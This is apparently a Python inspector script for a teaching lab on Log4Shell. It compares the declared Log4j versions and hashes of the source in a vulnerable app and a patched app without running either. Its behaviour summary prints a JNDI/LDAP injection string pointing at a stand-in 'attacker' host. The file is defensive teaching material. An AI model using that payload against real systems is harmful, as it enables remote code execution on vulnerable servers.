#!/usr/bin/env python3
"""
SC3010 Log4Shell lab -- static inspector.

Prints facts about the lab WITHOUT building or running anything and without
firing the exploit:

  * the Log4j version declared in each app's pom.xml,
  * a SHA-256 hash of each app's VulnerableApp.java, to prove the two apps
    share byte-for-byte identical source (so only the library differs),
  * the vulnerable app's declared dependency on log4j-core,
  * a short clean-vs-vulnerable behaviour summary.

Standard library only.  Usage:  python3 inspect_lab.py
"""

import hashlib
import pathlib
import re
import sys

ROOT = pathlib.Path(__file__).resolve().parent
SRC_REL = "src/main/java/com/sc3010/lab/VulnerableApp.java"


def rule(ch="-", n=70):
    print(ch * n)


def read(path):
    try:
        return path.read_text(encoding="utf-8")
    except OSError as exc:
        return None


def log4j_version(pom_text):
    if pom_text is None:
        return None
    m = re.search(r"<log4j\.version>\s*([^<]+?)\s*</log4j\.version>", pom_text)
    return m.group(1) if m else None


def sha256_of(path):
    data = path.read_bytes() if path.exists() else None
    if data is None:
        return None
    return hashlib.sha256(data).hexdigest()


def has_log4j_core(pom_text):
    if pom_text is None:
        return False
    return "log4j-core" in pom_text


def main():
    apps = {
        "vulnerable-app": ROOT / "vulnerable-app",
        "patched-app": ROOT / "patched-app",
    }

    print()
    rule("=")
    print(" SC3010 Log4Shell lab -- static inspection (no exploit run)")
    rule("=")

    # ---- Log4j versions -------------------------------------------------
    print("\n[1] Declared Log4j version per app (from pom.xml):")
    versions = {}
    for name, base in apps.items():
        pom = read(base / "pom.xml")
        ver = log4j_version(pom)
        versions[name] = ver
        print(f"      {name:16s} -> log4j-core/api {ver}")

    # ---- Source hashes --------------------------------------------------
    print("\n[2] SHA-256 of each app's VulnerableApp.java "
          "(proving only the library differs):")
    hashes = {}
    for name, base in apps.items():
        h = sha256_of(base / SRC_REL)
        hashes[name] = h
        short = (h[:16] + "...") if h else "MISSING"
        print(f"      {name:16s} -> {short}")

    distinct = {h for h in hashes.values() if h}
    if len(distinct) == 1 and None not in hashes.values():
        print("      => IDENTICAL application source. The ONLY difference")
        print(f"         between the experiments is the Log4j version "
              f"({versions['vulnerable-app']} vs {versions['patched-app']}).")
    else:
        print("      => WARNING: sources differ or a file is missing; this")
        print("         breaks the 'only the library changed' control.")

    # ---- Dependency on log4j-core --------------------------------------
    print("\n[3] Vulnerable app dependency check:")
    vuln_pom = read(apps["vulnerable-app"] / "pom.xml")
    if has_log4j_core(vuln_pom):
        print("      log4j-core IS declared as a dependency "
              "(the component that performs lookup substitution).")
    else:
        print("      log4j-core NOT found -- check the pom.xml.")

    # ---- Behaviour summary ---------------------------------------------
    print("\n[4] Clean-vs-vulnerable behaviour summary:")
    rule()
    print("      Input string: ${jndi:ldap://attacker:1389/Exploit}")
    print()
    print("      VULNERABLE (Log4j 2.14.1):")
    print("        - Log4j evaluates the ${jndi:...} lookup while logging.")
    print("        - JNDI/LDAP fetches a remote class and the JVM runs it.")
    print("        - Result: [EXPLOIT-PROOF] line appears.")
    print()
    print("      PATCHED (Log4j 2.17.1):")
    print("        - JNDI message lookups were removed in 2.16+.")
    print("        - The string is written to the log verbatim.")
    print("        - Result: no lookup, no class load, no proof line.")
    rule()

    ok = (len(distinct) == 1 and None not in hashes.values()
          and has_log4j_core(vuln_pom)
          and versions.get("vulnerable-app") == "2.14.1"
          and versions.get("patched-app") == "2.17.1")
    print(f"\nInspection result: "
          f"{'OK -- lab is internally consistent.' if ok else 'CHECK WARNINGS ABOVE.'}")
    print()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
